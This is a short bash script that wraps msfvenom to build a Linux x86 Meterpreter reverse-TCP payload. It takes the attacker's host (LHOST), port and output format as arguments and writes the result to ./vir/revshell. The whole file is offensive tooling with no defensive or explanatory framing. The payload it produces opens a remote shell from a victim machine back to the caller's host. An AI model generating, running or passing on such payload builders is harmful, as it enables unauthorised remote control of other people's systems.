#!/bin/bash

# $1 = LHOST ; $2 = LPORT ; $3 = extension
# independent of the current working directory
parent_path=$( cd "$(dirname "${BASH_SOURCE[0]}")" ; pwd -P )
cd "$parent_path"

if [ $# != 3 ]
then
    echo "Missing arguments : LHOST LPORT extension"
    exit
else
    msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$1 LPORT=$2 -f $3 -o ./vir/revshell 2> /dev/null
fi